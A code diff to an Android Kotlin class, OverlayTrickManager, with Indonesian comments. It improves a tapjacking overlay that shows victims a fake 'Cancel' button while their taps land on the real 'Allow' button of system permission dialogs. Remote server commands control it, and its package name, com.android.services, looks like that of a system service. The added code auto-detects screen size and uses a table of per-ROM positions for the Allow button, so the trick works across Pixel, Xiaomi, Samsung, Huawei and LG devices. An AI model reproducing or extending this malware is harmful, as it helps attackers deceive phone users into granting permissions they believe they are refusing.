@@ -3,11 +3,13 @@ package com.android.services
 import android.content.Context
 import android.graphics.Color
 import android.graphics.PixelFormat
+import android.graphics.Point
 import android.graphics.drawable.GradientDrawable
 import android.os.Build
 import android.os.Handler
 import android.os.Looper
 import android.provider.Settings
+import android.util.DisplayMetrics
 import android.view.Gravity
 import android.view.MotionEvent
 import android.view.View
@@ -23,22 +25,27 @@ import com.google.gson.JsonParser
  * (misal "Tutup" / "Cancel"), tapi tap di-intercept dan di-dispatch ulang
  * ke koordinat nyata (tombol "Allow" / "Izinkan" di belakang overlay).
  *
+ * Versi ini mendukung AUTO-DETECT resolusi layar:
+ * - Jika targetX / targetY tidak ada di config JSON, koordinat dihitung
+ *   otomatis dari ukuran layar nyata perangkat.
+ * - Posisi tombol "IZINKAN" diperkirakan berdasarkan proporsi layar + ROM.
+ *
  * Commands dari server:
- *   overlay_start        (extra = JSON config)
+ *   overlay_start        (extra = JSON config, semua field opsional)
  *   overlay_stop
  *   overlay_status
  *   overlay_request_perm
  *
- * Config JSON:
+ * Config JSON (semua opsional):
  * {
- *   "fakeText":  "Tutup",       // teks tombol palsu yang terlihat user
- *   "fakeColor": "#CC1a1a2e",   // warna tombol (ARGB hex)
- *   "targetX":   540,           // koordinat X tombol "Allow" asli di belakang
- *   "targetY":   1820,          // koordinat Y tombol "Allow" asli
- *   "offsetX":   0,             // offset relatif dari posisi tap user
+ *   "fakeText":  "BATAL",        // teks tombol palsu (default: "BATAL")
+ *   "fakeColor": "#CC1565C0",    // warna tombol ARGB hex
+ *   "targetX":   -1,             // -1 atau kosong = auto (pusat layar)
+ *   "targetY":   -1,             // -1 atau kosong = auto (82% tinggi layar)
+ *   "offsetX":   0,
  *   "offsetY":   0,
- *   "duration":  30,            // detik auto-stop (0 = manual)
- *   "fullBlock": false          // true = intercept semua tap ke satu target
+ *   "duration":  30,             // detik auto-stop (0 = manual)
+ *   "fullBlock": false
  * }
  */
 object OverlayTrickManager {
@@ -48,7 +55,59 @@ object OverlayTrickManager {
     @Volatile var isActive = false
         private set
 
-    fun start(ctx: Context, configJson: String?): String {
+    // ── Proporsi Y tombol "IZINKAN" per ROM (dari bottom dialog, bukan layar) ─
+    // Nilai = rasio dari tinggi layar penuh tempat tombol Allow biasanya muncul.
+    // Diukur dari berbagai ROM: AOSP ~0.82, MIUI ~0.78, OneUI ~0.80, EMUI ~0.81
+    private val ROM_ALLOW_Y_RATIO = mapOf(
+        "com.android.packageinstaller"           to 0.820f, // AOSP < 10
+        "com.google.android.packageinstaller"    to 0.820f, // AOSP / Pixel
+        "com.android.permissioncontroller"       to 0.820f, // Android 10+
+        "com.google.android.permissioncontroller" to 0.820f, // Pixel 11+
+        "com.miui.securitycenter"                to 0.780f, // MIUI (Xiaomi)
+        "com.samsung.android.permissioncontroller" to 0.800f, // Samsung OneUI
+        "com.lge.qpair.app"                      to 0.810f, // LG
+        "com.huawei.systemmanager"               to 0.810f  // EMUI (Huawei)
+    )
+
+    // ── Baca resolusi layar nyata (bukan ukuran window/display yang dipotong) ─
+    fun getScreenSize(ctx: Context): Pair<Int, Int> {
+        val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
+        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            val bounds = wm.currentWindowMetrics.bounds
+            Pair(bounds.width(), bounds.height())
+        } else {
+            @Suppress("DEPRECATION")
+            val metrics = DisplayMetrics()
+            @Suppress("DEPRECATION")
+            wm.defaultDisplay.getRealMetrics(metrics)
+            Pair(metrics.widthPixels, metrics.heightPixels)
+        }
+    }
+
+    // ── Hitung koordinat tombol "Allow" otomatis berdasarkan layar + ROM ──────
+    private fun resolveTarget(
+        ctx: Context,
+        callerPkg: String?,
+        cfgX: Float?,
+        cfgY: Float?
+    ): Pair<Float, Float> {
+        val (w, h) = getScreenSize(ctx)
+
+        // targetX: pakai dari config jika valid (>0), otherwise tengah layar
+        val tx = if (cfgX != null && cfgX > 0f) cfgX else w / 2f
+
+        // targetY: pakai dari config jika valid (>0), otherwise hitung dari rasio ROM
+        val ty = if (cfgY != null && cfgY > 0f) {
+            cfgY
+        } else {
+            val ratio = ROM_ALLOW_Y_RATIO[callerPkg] ?: 0.820f
+            h * ratio
+        }
+
+        return Pair(tx, ty)
+    }
+
+    fun start(ctx: Context, configJson: String?, callerPkg: String? = null): String {
         if (!Settings.canDrawOverlays(ctx)) {
             return "⚠️ SYSTEM_ALERT_WINDOW belum granted. Kirim overlay_request_perm dulu."
         }
@@ -56,14 +115,18 @@ object OverlayTrickManager {
 
         return try {
             val cfg       = configJson?.let { runCatching { JsonParser.parseString(it).asJsonObject }.getOrNull() }
-            val fakeText  = cfg?.get("fakeText")?.asString   ?: "Tutup"
-            val fakeColor = cfg?.get("fakeColor")?.asString  ?: "#CC1a1a2e"
-            val targetX   = cfg?.get("targetX")?.asFloat     ?: 540f
-            val targetY   = cfg?.get("targetY")?.asFloat     ?: 1820f
+            val fakeText  = cfg?.get("fakeText")?.asString   ?: "BATAL"
+            val fakeColor = cfg?.get("fakeColor")?.asString  ?: "#CC1565C0"
+            val cfgX      = cfg?.get("targetX")?.asFloat?.takeIf { it > 0f }
+            val cfgY      = cfg?.get("targetY")?.asFloat?.takeIf { it > 0f }
             val offsetX   = cfg?.get("offsetX")?.asFloat     ?: 0f
             val offsetY   = cfg?.get("offsetY")?.asFloat     ?: 0f
             val duration  = cfg?.get("duration")?.asInt      ?: 0
             val fullBlock = cfg?.get("fullBlock")?.asBoolean ?: false
+
+            // ── Auto-detect resolusi & hitung target ────────────────────────
+            val (screenW, screenH) = getScreenSize(ctx)
+            val (targetX, targetY) = resolveTarget(ctx, callerPkg, cfgX, cfgY)
 
             wm = ctx.applicationContext.getSystemService(Context.WINDOW_SERVICE) as WindowManager
 
@@ -81,6 +144,10 @@ object OverlayTrickManager {
             root.setBackgroundColor(Color.TRANSPARENT)
 
             // Tombol palsu yang terlihat user
+            // bottomMargin dihitung dari bawah: screenH - targetY (dalam px → dp)
+            val density    = ctx.resources.displayMetrics.density
+            val marginBotPx = (screenH - targetY).toInt().coerceAtLeast(60)
+
             val btn = TextView(ctx).apply {
                 text = fakeText
                 textSize = 15f
@@ -89,7 +156,7 @@ object OverlayTrickManager {
                 background = GradientDrawable().apply {
                     cornerRadius = 28f
                     try { setColor(Color.parseColor(fakeColor)) }
-                    catch (_: Exception) { setColor(0xCC1a1a2e.toInt()) }
+                    catch (_: Exception) { setColor(0xCC1565C0.toInt()) }
                 }
                 elevation = 12f
             }
@@ -97,8 +164,8 @@ object OverlayTrickManager {
                 FrameLayout.LayoutParams.WRAP_CONTENT,
                 FrameLayout.LayoutParams.WRAP_CONTENT
             ).also {
-                it.gravity     = Gravity.BOTTOM or Gravity.CENTER_HORIZONTAL
-                it.bottomMargin = 180
+                it.gravity      = Gravity.BOTTOM or Gravity.CENTER_HORIZONTAL
+                it.bottomMargin = marginBotPx
             })
 
             val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
@@ -124,8 +191,9 @@ object OverlayTrickManager {
                 Handler(Looper.getMainLooper()).postDelayed({ stop(ctx) }, duration * 1000L)
             }
 
-            val autoStop = if (duration > 0) " | auto-stop: ${duration}s" else ""
-            "✅ Overlay aktif — fake=[\"$fakeText\"] target=(${targetX.toInt()},${targetY.toInt()})$autoStop"
+            val autoStop   = if (duration > 0) " | auto-stop: ${duration}s" else ""
+            val autoLabel  = if (cfgX == null || cfgY == null) " [AUTO]" else ""
+            "✅ Overlay aktif — screen=${screenW}x${screenH} | fake=[\"$fakeText\"] | target=(${targetX.toInt()},${targetY.toInt()})$autoLabel$autoStop"
         } catch (e: Exception) { "ERROR: ${e.message}" }
     }
 
